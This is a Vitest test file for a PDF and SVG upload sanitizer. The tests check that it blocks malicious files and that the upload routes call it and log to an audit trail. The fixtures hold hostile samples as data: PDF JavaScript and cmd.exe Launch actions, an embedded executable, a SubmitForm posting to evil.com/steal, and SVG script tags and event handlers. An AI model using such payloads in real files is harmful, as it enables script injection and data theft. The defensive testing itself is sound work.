import { describe, it, expect } from "vitest";
import { sanitizePdf, sanitizeSvg, sanitizeFile } from "./file-sanitizer";
import fs from "fs";
import path from "path";

// ═══════════════════════════════════════════════════════════════════════════════
// FILE SANITIZER TESTS — Malicious file detection
// ═══════════════════════════════════════════════════════════════════════════════

describe("File Sanitizer", () => {

  describe("PDF Sanitization", () => {
    it("allows a normal PDF without threats", () => {
      // Minimal valid PDF structure
      const normalPdf = Buffer.from("%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF");
      const result = sanitizePdf(normalPdf);
      expect(result.safe).toBe(true);
      expect(result.threats).toHaveLength(0);
      expect(result.fileType).toBe("PDF");
    });

    it("blocks PDF with JavaScript", () => {
      const maliciousPdf = Buffer.from("%PDF-1.4\n/JavaScript /JS (app.alert('XSS'))\n%%EOF");
      const result = sanitizePdf(maliciousPdf);
      expect(result.safe).toBe(false);
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.threats[0]).toMatch(/JavaScript/i);
    });

    it("blocks PDF with Launch action", () => {
      const maliciousPdf = Buffer.from("%PDF-1.4\n/Launch /Action /F (cmd.exe)\n%%EOF");
      const result = sanitizePdf(maliciousPdf);
      expect(result.safe).toBe(false);
      expect(result.threats[0]).toMatch(/Launch/i);
    });

    it("blocks PDF with embedded executable", () => {
      const maliciousPdf = Buffer.from("%PDF-1.4\n/EmbeddedFile payload.exe\n%%EOF");
      const result = sanitizePdf(maliciousPdf);
      expect(result.safe).toBe(false);
      expect(result.threats[0]).toMatch(/executável/i);
    });

    it("blocks PDF with data: URI", () => {
      const maliciousPdf = Buffer.from("%PDF-1.4\n/URI (data:text/html,<script>alert(1)</script>)\n%%EOF");
      const result = sanitizePdf(maliciousPdf);
      expect(result.safe).toBe(false);
      expect(result.threats[0]).toMatch(/URI|protocolo/i);
    });

    it("blocks PDF with SubmitForm action", () => {
      const maliciousPdf = Buffer.from("%PDF-1.4\n/SubmitForm /URL (https://evil.com/steal)\n%%EOF");
      const result = sanitizePdf(maliciousPdf);
      expect(result.safe).toBe(false);
      expect(result.threats[0]).toMatch(/formulário|submissão/i);
    });
  });

  describe("SVG Sanitization", () => {
    it("allows a normal SVG", () => {
      const normalSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100" fill="red"/></svg>');
      const result = sanitizeSvg(normalSvg);
      expect(result.safe).toBe(true);
      expect(result.threats).toHaveLength(0);
    });

    it("blocks SVG with script tag", () => {
      const maliciousSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>');
      const result = sanitizeSvg(maliciousSvg);
      expect(result.safe).toBe(false);
      expect(result.threats[0]).toMatch(/script/i);
    });

    it("blocks SVG with event handler", () => {
      const maliciousSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><rect onload="alert(1)" /></svg>');
      const result = sanitizeSvg(maliciousSvg);
      expect(result.safe).toBe(false);
      expect(result.threats[0]).toMatch(/event handler/i);
    });

    it("blocks SVG with foreignObject", () => {
      const maliciousSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>');
      const result = sanitizeSvg(maliciousSvg);
      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.match(/foreignObject/i))).toBe(true);
    });
  });

  describe("General sanitizeFile", () => {
    it("allows JPEG images without scanning", async () => {
      const jpegBuffer = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]); // JPEG magic bytes
      const result = await sanitizeFile(jpegBuffer, "image/jpeg", "photo.jpg");
      expect(result.safe).toBe(true);
    });

    it("allows PNG images without scanning", async () => {
      const pngBuffer = Buffer.from([0x89, 0x50, 0x4E, 0x47]); // PNG magic bytes
      const result = await sanitizeFile(pngBuffer, "image/png", "photo.png");
      expect(result.safe).toBe(true);
    });

    it("allows CSV files without scanning", async () => {
      const csvBuffer = Buffer.from("name,value\ntest,123");
      const result = await sanitizeFile(csvBuffer, "text/csv", "data.csv");
      expect(result.safe).toBe(true);
    });

    it("scans PDFs for threats", async () => {
      const maliciousPdf = Buffer.from("%PDF-1.4\n/JavaScript /JS (evil)\n%%EOF");
      const result = await sanitizeFile(maliciousPdf, "application/pdf", "report.pdf");
      expect(result.safe).toBe(false);
    });

    it("scans SVGs for threats", async () => {
      const maliciousSvg = Buffer.from('<svg><script>alert(1)</script></svg>');
      const result = await sanitizeFile(maliciousSvg, "image/svg+xml", "icon.svg");
      expect(result.safe).toBe(false);
    });
  });

  describe("Integration with routers.ts", () => {
    it("sanitizeFile is imported in routers.ts", () => {
      const routersCode = fs.readFileSync(path.join(__dirname, "routers.ts"), "utf-8");
      expect(routersCode).toMatch(/import.*sanitizeFile.*file-sanitizer/);
    });

    it("all upload endpoints call sanitizeFile", () => {
      const routersCode = fs.readFileSync(path.join(__dirname, "routers.ts"), "utf-8");
      const sanitizeCalls = (routersCode.match(/sanitizeFile\(/g) || []).length;
      expect(sanitizeCalls).toBeGreaterThanOrEqual(4); // 4 upload endpoints
    });

    it("all upload endpoints log to audit trail", () => {
      const routersCode = fs.readFileSync(path.join(__dirname, "routers.ts"), "utf-8");
      const logCalls = (routersCode.match(/logFileUpload\(/g) || []).length;
      expect(logCalls).toBeGreaterThanOrEqual(4);
    });

    it("blocked files throw BAD_REQUEST with threat description", () => {
      const routersCode = fs.readFileSync(path.join(__dirname, "routers.ts"), "utf-8");
      expect(routersCode).toMatch(/Ficheiro rejeitado por segurança/);
    });
  });
});
